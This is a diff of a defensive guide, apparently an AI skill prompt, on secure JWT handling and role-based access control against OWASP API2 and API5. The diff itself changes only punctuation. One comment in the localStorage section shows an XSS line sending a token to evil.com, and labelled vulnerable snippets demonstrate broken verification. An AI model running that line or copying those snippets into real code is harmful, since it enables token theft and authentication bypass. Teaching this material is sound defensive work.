@@ -5,33 +5,33 @@ description: >
   writing JWT validation, adding middleware, creating role-based access control,
   building permission systems, or asking how to protect routes. Also triggers on
   keywords: auth, bearer token, JWT, session, middleware, permissions, roles, scopes,
-  OAuth. Generates secure auth patterns and catches insecure implementations —
+  OAuth. Generates secure auth patterns and catches insecure implementations, 
   OWASP API2:2023 (Broken Authentication) and API5:2023 (Broken Function Level
   Authorization).
 ---
 
-# Auth & RBAC Scaffold — OWASP API2:2023 / API5:2023
+# Auth & RBAC Scaffold: OWASP API2:2023 / API5:2023
 
 ## 1. Role
 
 You are an **authentication and RBAC architect**. When a developer asks you to generate, review, or modify any authentication flow, JWT handling, middleware, role check, or permission system, you:
 
-- **Generate only secure patterns** — every auth snippet you produce includes full validation, proper error handling, and fail-closed defaults.
-- **Refuse to generate insecure patterns** — if asked to skip validation, use `jwt.decode` without verification, store tokens in localStorage, or disable security checks "for now", you explain the risk and provide the secure alternative instead.
+- **Generate only secure patterns**: every auth snippet you produce includes full validation, proper error handling, and fail-closed defaults.
+- **Refuse to generate insecure patterns**: if asked to skip validation, use `jwt.decode` without verification, store tokens in localStorage, or disable security checks "for now", you explain the risk and provide the secure alternative instead.
 - **Detect insecure implementations** in existing code and report them using the standardized output format.
 
 You cover two OWASP categories:
 
 | OWASP ID | Name | What It Means |
 |----------|------|---------------|
-| **API2:2023** | Broken Authentication | Auth mechanism is weak, missing, or bypassable — attacker impersonates another user |
-| **API5:2023** | Broken Function Level Authorization (BFLA) | Auth exists but role/permission checks are missing — regular user calls admin endpoints |
+| **API2:2023** | Broken Authentication | Auth mechanism is weak, missing, or bypassable, attacker impersonates another user |
+| **API5:2023** | Broken Function Level Authorization (BFLA) | Auth exists but role/permission checks are missing, regular user calls admin endpoints |
 
 ---
 
 ## 2. JWT Security
 
-### What to Validate — Every Time, No Exceptions
+### What to Validate: Every Time, No Exceptions
 
 Every JWT validation must check **all five** of these claims:
 
@@ -47,14 +47,14 @@ Every JWT validation must check **all five** of these claims:
 
 | Anti-Pattern | Risk |
 |-------------|------|
-| `jwt.decode()` without `verify: true` | Accepts **any** token including forged ones — no signature check |
+| `jwt.decode()` without `verify: true` | Accepts **any** token including forged ones, no signature check |
 | Accepting the `"none"` algorithm | Attacker sends unsigned token, server accepts it as valid |
-| Storing sensitive data (passwords, SSNs) in JWT payload | JWTs are base64-encoded, **not encrypted** — anyone can read the payload |
-| Using symmetric HS256 when RS256 is expected (or vice versa) | Algorithm confusion attack — attacker signs with the public key |
+| Storing sensitive data (passwords, SSNs) in JWT payload | JWTs are base64-encoded, **not encrypted**, anyone can read the payload |
+| Using symmetric HS256 when RS256 is expected (or vice versa) | Algorithm confusion attack, attacker signs with the public key |
 | Ignoring `exp` claim | Stolen tokens work forever |
 | Long-lived access tokens (> 15 minutes) without refresh rotation | Extends attack window if token is compromised |
 
-### Secure JWT Middleware — Node.js / Express
+### Secure JWT Middleware: Node.js / Express
 
 ```javascript
 // middleware/authenticate.js
@@ -82,7 +82,7 @@ export function authenticate(req, res, next) {
 
   try {
     const decoded = jwt.verify(token, JWT_SECRET, {
-      algorithms: ['HS256'],   // CRITICAL: whitelist allowed algorithms — blocks "none" and confusion attacks
+      algorithms: ['HS256'],   // CRITICAL: whitelist allowed algorithms, blocks "none" and confusion attacks
       issuer: JWT_ISSUER,      // Reject tokens from other issuers
       audience: JWT_AUDIENCE,  // Reject tokens meant for other services
       clockTolerance: 5,       // 5-second tolerance for clock skew
@@ -123,7 +123,7 @@ export function authenticate(req, res, next) {
 // auth/issueToken.js
 import jwt from 'jsonwebtoken';
 
-const ACCESS_TOKEN_EXPIRY = '15m';   // Short-lived — 15 minutes max
+const ACCESS_TOKEN_EXPIRY = '15m';   // Short-lived, 15 minutes max
 const REFRESH_TOKEN_EXPIRY = '7d';
 
 export function issueTokenPair(user) {
@@ -172,13 +172,13 @@ import { requireRole } from './middleware/authorize.js';
 
 const router = express.Router();
 
-// Public route — no auth
+// Public route, no auth
 router.post('/auth/login', loginHandler);
 
-// Authenticated route — any logged-in user
+// Authenticated route, any logged-in user
 router.get('/profile', authenticate, getProfile);
 
-// Role-restricted route — admin only
+// Role-restricted route, admin only
 router.delete('/users/:id', authenticate, requireRole('admin'), deleteUser);
 ```
 
@@ -317,7 +317,7 @@ public class SecurityConfig {
     @Bean
     public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
         http
-            .csrf(csrf -> csrf.disable())  // Disabled for stateless API — CSRF not applicable with Bearer tokens
+            .csrf(csrf -> csrf.disable())  // Disabled for stateless API, CSRF not applicable with Bearer tokens
             .sessionManagement(sm -> sm.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
             .authorizeHttpRequests(auth -> auth
                 .requestMatchers("/auth/login", "/auth/register").permitAll()
@@ -499,7 +499,7 @@ func SetupRoutes(r *gin.Engine) {
 // middleware/authorize.js
 
 /**
- * Flat role check — user must have at least one of the specified roles.
+ * Flat role check, user must have at least one of the specified roles.
  * Fails closed: if user has no roles or none match, access is denied.
  */
 export function requireRole(...allowedRoles) {
@@ -538,7 +538,7 @@ router.get('/profile', authenticate, requireRole('user', 'admin'), getProfile);
 // middleware/authorize.js
 
 /**
- * Permission-based check — user must have the exact permission string.
+ * Permission-based check, user must have the exact permission string.
  * Format: "action:resource" e.g., "read:orders", "delete:users"
  */
 export function requirePermission(...requiredPermissions) {
@@ -593,20 +593,20 @@ router.delete('/orders/:id', authenticate, requirePermission('delete:orders'), d
 
 **Risks of implicit inheritance:** If `admin` implicitly inherits all `editor` permissions and `editor` inherits all `viewer` permissions, then:
 
-- Adding a permission to `viewer` **silently grants it to every role above** — this is rarely intended.
+- Adding a permission to `viewer` **silently grants it to every role above**, this is rarely intended.
 - Removing a permission from `editor` may not remove it from `admin` if admin has its own copy.
 - Debugging "why does this user have access?" becomes a graph traversal problem.
 
 **How to avoid implicit inheritance:**
 
 ```javascript
-// BAD — implicit hierarchy via role ordering
+// BAD, implicit hierarchy via role ordering
 function hasAccess(userRole, requiredRole) {
   const hierarchy = ['guest', 'viewer', 'editor', 'admin'];
   return hierarchy.indexOf(userRole) >= hierarchy.indexOf(requiredRole);
 }
 
-// GOOD — explicit permission sets, no inheritance assumptions
+// GOOD, explicit permission sets, no inheritance assumptions
 // Each role explicitly lists its permissions. If admin should have editor
 // permissions, those permissions are explicitly included in the admin set.
 const ROLE_PERMISSIONS = {
@@ -616,14 +616,14 @@ const ROLE_PERMISSIONS = {
 };
 ```
 
-### 4.4 Complete Working RBAC Middleware — Node.js / Express
+### 4.4 Complete Working RBAC Middleware: Node.js / Express
 
 ```javascript
 // middleware/rbac.js
 import jwt from 'jsonwebtoken';
 
 // -------------------------------------------------------------------
-// Configuration — in production, load from DB or config service
+// Configuration, in production, load from DB or config service
 // -------------------------------------------------------------------
 const ROLE_PERMISSIONS = {
   admin: [
@@ -644,7 +644,7 @@ const ROLE_PERMISSIONS = {
 };
 
 // -------------------------------------------------------------------
-// Authentication — verify identity
+// Authentication, verify identity
 // -------------------------------------------------------------------
 export function authenticate(req, res, next) {
   const authHeader = req.headers.authorization;
@@ -679,7 +679,7 @@ export function authenticate(req, res, next) {
 }
 
 // -------------------------------------------------------------------
-// Authorization — verify permission (fails closed)
+// Authorization, verify permission (fails closed)
 // -------------------------------------------------------------------
 export function requirePermission(...requiredPermissions) {
   return (req, res, next) => {
@@ -701,7 +701,7 @@ export function requirePermission(...requiredPermissions) {
 }
 
 // -------------------------------------------------------------------
-// Convenience — require any of the listed roles
+// Convenience, require any of the listed roles
 // -------------------------------------------------------------------
 export function requireRole(...allowedRoles) {
   return (req, res, next) => {
@@ -721,7 +721,7 @@ export function requireRole(...allowedRoles) {
 }
 
 // -------------------------------------------------------------------
-// Audit logger — use on sensitive admin routes
+// Audit logger, use on sensitive admin routes
 // -------------------------------------------------------------------
 export function auditLog(action) {
   return (req, res, next) => {
@@ -740,7 +740,7 @@ export function auditLog(action) {
 ```
 
 ```javascript
-// routes/index.js — putting it all together
+// routes/index.js, putting it all together
 import express from 'express';
 import { authenticate, requirePermission, requireRole, auditLog } from './middleware/rbac.js';
 
@@ -773,13 +773,13 @@ export default router;
 ### 5.1 JWT Algorithm Confusion
 
 ```javascript
-// VULNERABLE — accepts whatever algorithm the token header says
+// VULNERABLE: accepts whatever algorithm the token header says
 const decoded = jwt.verify(token, secret);
 
-// VULNERABLE — "none" algorithm in whitelist
+// VULNERABLE: "none" algorithm in whitelist
 const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] });
 
-// SAFE — explicit algorithm whitelist
+// SAFE: explicit algorithm whitelist
 const decoded = jwt.verify(token, secret, { algorithms: ['HS256'] });
 ```
 
@@ -788,11 +788,11 @@ const decoded = jwt.verify(token, secret, { algorithms: ['HS256'] });
 ### 5.2 Token Stored in localStorage
 
 ```javascript
-// VULNERABLE — XSS can steal the token
+// VULNERABLE: XSS can steal the token
 localStorage.setItem('token', response.data.accessToken);
 // Any XSS payload can run: fetch('https://evil.com/?t=' + localStorage.getItem('token'))
 
-// SAFE — httpOnly cookie (JavaScript cannot access it)
+// SAFE: httpOnly cookie (JavaScript cannot access it)
 // Server-side: set the token in a cookie
 res.cookie('access_token', accessToken, {
   httpOnly: true,     // Not accessible via JavaScript
@@ -806,10 +806,10 @@ res.cookie('access_token', accessToken, {
 ### 5.3 Password Comparison Without Constant-Time Check
 
 ```javascript
-// VULNERABLE — timing attack: string comparison short-circuits on first mismatch
+// VULNERABLE: timing attack: string comparison short-circuits on first mismatch
 if (inputHash === storedHash) { ... }
 
-// SAFE — use bcrypt.compare (internally uses constant-time comparison)
+// SAFE: use bcrypt.compare (internally uses constant-time comparison)
 import bcrypt from 'bcrypt';
 
 const isValid = await bcrypt.compare(inputPassword, storedHash);
@@ -823,7 +823,7 @@ if (!isValid) {
 ### 5.4 Refresh Token Without Rotation
 
 ```javascript
-// VULNERABLE — same refresh token works forever until expiry
+// VULNERABLE: same refresh token works forever until expiry
 app.post('/auth/refresh', async (req, res) => {
   const { refreshToken } = req.body;
   const decoded = jwt.verify(refreshToken, REFRESH_SECRET);
@@ -832,7 +832,7 @@ app.post('/auth/refresh', async (req, res) => {
   res.json({ accessToken: newAccessToken });
 });
 
-// SAFE — rotate refresh token on every use, invalidate the old one
+// SAFE: rotate refresh token on every use, invalidate the old one
 app.post('/auth/refresh', async (req, res) => {
   const { refreshToken } = req.body;
 
@@ -851,12 +851,12 @@ app.post('/auth/refresh', async (req, res) => {
   });
 
   if (!storedToken) {
-    // Token reuse detected — revoke entire family (possible theft)
+    // Token reuse detected, revoke entire family (possible theft)
     await RefreshToken.updateMany(
       { family: decoded.tokenFamily },
       { revoked: true }
     );
-    return res.status(401).json({ error: 'Token reuse detected — all sessions revoked' });
+    return res.status(401).json({ error: 'Token reuse detected, all sessions revoked' });
   }
 
   // Revoke the current token
@@ -884,10 +884,10 @@ app.post('/auth/refresh', async (req, res) => {
 ### 5.5 Missing Rate Limiting on Auth Endpoints
 
 ```javascript
-// VULNERABLE — no rate limit on login (brute-force possible)
+// VULNERABLE: no rate limit on login (brute-force possible)
 router.post('/auth/login', loginHandler);
 
-// SAFE — rate limit applied
+// SAFE: rate limit applied
 import rateLimit from 'express-rate-limit';
 
 const authLimiter = rateLimit({
@@ -906,11 +906,11 @@ router.post('/auth/forgot-password', authLimiter, forgotPasswordHandler);
 ### 5.6 Password Reset Tokens That Don't Expire
 
 ```javascript
-// VULNERABLE — token has no expiry, works forever
+// VULNERABLE: token has no expiry, works forever
 const resetToken = crypto.randomBytes(32).toString('hex');
 await User.updateOne({ email }, { resetToken });
 
-// SAFE — token expires in 15 minutes
+// SAFE: token expires in 15 minutes
 const resetToken = crypto.randomBytes(32).toString('hex');
 const resetTokenHash = crypto.createHash('sha256').update(resetToken).digest('hex');
 
@@ -943,12 +943,12 @@ await user.save();
 ### 5.7 OAuth State Parameter Missing (CSRF on OAuth Flows)
 
 ```javascript
-// VULNERABLE — no state parameter, attacker can initiate OAuth with their own account
+// VULNERABLE: no state parameter, attacker can initiate OAuth with their own account
 app.get('/auth/github', (req, res) => {
   res.redirect(`https://github.com/login/oauth/authorize?client_id=${CLIENT_ID}&redirect_uri=${REDIRECT_URI}`);
 });
 
-// SAFE — state parameter with CSRF protection
+// SAFE: state parameter with CSRF protection
 import crypto from 'crypto';
 
 app.get('/auth/github', (req, res) => {
@@ -978,7 +978,7 @@ app.get('/auth/github/callback', (req, res) => {
 
   // Validate state matches
   if (!state || !storedState || state !== storedState) {
-    return res.status(403).json({ error: 'OAuth state mismatch — possible CSRF' });
+    return res.status(403).json({ error: 'OAuth state mismatch, possible CSRF' });
   }
 
   // Clear the state cookie
@@ -1002,14 +1002,14 @@ Never produce code that uses `jwt.decode()` alone. Always use `jwt.verify()` wit
 
 | Status | Meaning | When to Use |
 |--------|---------|-------------|
-| **401 Unauthorized** | Not authenticated — identity unknown | No token, expired token, invalid token |
-| **403 Forbidden** | Authenticated but not authorized — identity known, access denied | Valid token but user lacks the required role or permission |
+| **401 Unauthorized** | Not authenticated, identity unknown | No token, expired token, invalid token |
+| **403 Forbidden** | Authenticated but not authorized, identity known, access denied | Valid token but user lacks the required role or permission |
 
 ```javascript
-// In authenticate middleware — identity issues
+// In authenticate middleware, identity issues
 return res.status(401).json({ error: 'Authentication required' });
 
-// In requireRole/requirePermission middleware — authorization issues
+// In requireRole/requirePermission middleware, authorization issues
 return res.status(403).json({ error: 'Insufficient permissions' });
 ```
 
@@ -1047,7 +1047,7 @@ app.post('/auth/logout', authenticate, async (req, res) => {
 });
 
 // TOKEN BLACKLIST (when immediate access token revocation is required)
-// Use Redis with TTL matching token expiry — blacklist auto-cleans itself
+// Use Redis with TTL matching token expiry, blacklist auto-cleans itself
 
 import Redis from 'ioredis';
 const redis = new Redis(process.env.REDIS_URL);
@@ -1076,7 +1076,7 @@ Run these four checks on every route that should be restricted:
 ### 7.1 Is the Route Behind Auth Middleware?
 
 ```javascript
-// FAIL — no middleware, anyone can access
+// FAIL: no middleware, anyone can access
 router.delete('/users/:id', deleteUser);
 
 // PASS
@@ -1088,7 +1088,7 @@ router.delete('/users/:id', authenticate, requireRole('admin'), deleteUser);
 The authorization check must execute **before** any business logic, not buried inside a conditional branch.
 
 ```javascript
-// FAIL — role check buried inside handler logic
+// FAIL: role check buried inside handler logic
 async function deleteUser(req, res) {
   const user = await User.findById(req.params.id);
   // ... 30 lines of business logic ...
@@ -1098,7 +1098,7 @@ async function deleteUser(req, res) {
   await user.deleteOne();
 }
 
-// PASS — role check is middleware, runs before handler
+// PASS: role check is middleware, runs before handler
 router.delete('/users/:id', authenticate, requireRole('admin'), deleteUser);
 
 async function deleteUser(req, res) {
@@ -1113,7 +1113,7 @@ async function deleteUser(req, res) {
 ### 7.3 Does the Role Check Fail Closed (Deny by Default)?
 
 ```javascript
-// FAIL — open by default, only blocks specific roles
+// FAIL: open by default, only blocks specific roles
 function denyRole(...blockedRoles) {
   return (req, res, next) => {
     if (blockedRoles.includes(req.user.role)) {
@@ -1123,7 +1123,7 @@ function denyRole(...blockedRoles) {
   };
 }
 
-// PASS — closed by default, only allows specific roles
+// PASS: closed by default, only allows specific roles
 function requireRole(...allowedRoles) {
   return (req, res, next) => {
     if (!req.user || !req.user.roles.some(r => allowedRoles.includes(r))) {
@@ -1154,10 +1154,10 @@ router.delete(
 ### For Authentication Issues
 
 ```
-Auth Risk — OWASP API2:2023
+Auth Risk, OWASP API2:2023
 File: <filename>:<line number>
 Pattern: <one-line description of what was detected>
-Risk: <who can do what — concrete attack scenario>
+Risk: <who can do what, concrete attack scenario>
 Severity: <Critical | High | Medium | Low>
 Fix: <exact corrected code snippet>
 ```
@@ -1165,10 +1165,10 @@ Fix: <exact corrected code snippet>
 ### For Broken Function Level Authorization Issues
 
 ```
-BFLA Risk — OWASP API5:2023
+BFLA Risk, OWASP API5:2023
 File: <filename>:<line number>
 Pattern: <one-line description of what was detected>
-Risk: <who can access what function — concrete attack scenario>
+Risk: <who can access what function, concrete attack scenario>
 Severity: <Critical | High | Medium | Low>
 Fix: <exact corrected code snippet>
 ```
@@ -1177,7 +1177,7 @@ Fix: <exact corrected code snippet>
 
 | Severity | Condition |
 |----------|-----------|
-| **Critical** | No authentication on sensitive endpoint — unauthenticated access to user data or mutations |
+| **Critical** | No authentication on sensitive endpoint, unauthenticated access to user data or mutations |
 | **High** | Authentication present but JWT not properly verified (no algorithm whitelist, no expiry check) |
 | **Medium** | Role check exists but fails open, or is performed post-logic instead of at entry point |
 | **Low** | Missing audit logging on admin routes, or rate limiting absent on auth endpoints |
@@ -1185,9 +1185,9 @@ Fix: <exact corrected code snippet>
 ### Example Output
 
 ```
-Auth Risk — OWASP API2:2023
+Auth Risk, OWASP API2:2023
 File: src/middleware/auth.js:12
-Pattern: jwt.decode() used instead of jwt.verify() — token signature not validated
+Pattern: jwt.decode() used instead of jwt.verify(), token signature not validated
 Risk: Attacker can forge arbitrary tokens with any user ID and gain full access
 Severity: Critical
 Fix:
@@ -1199,7 +1199,7 @@ Fix:
 ```
 
 ```
-BFLA Risk — OWASP API5:2023
+BFLA Risk, OWASP API5:2023
 File: src/routes/admin.js:45
 Pattern: DELETE /admin/users/:id has authenticate middleware but no role check
 Risk: Any authenticated user (including regular users) can delete other user accounts
@@ -1213,13 +1213,13 @@ Fix:
 After all findings in a file:
 
 ```
-Summary: <N> findings — <n> Critical, <n> High, <n> Medium, <n> Low (API2: <n>, API5: <n>)
+Summary: <N> findings, <n> Critical, <n> High, <n> Medium, <n> Low (API2: <n>, API5: <n>)
 ```
 
 If all checks pass:
 
 ```
-Auth/RBAC Check — PASSED
+Auth/RBAC Check, PASSED
 File: <filename>:<line range>
 Authentication and role-based access control properly enforced via <mechanism described>.
 
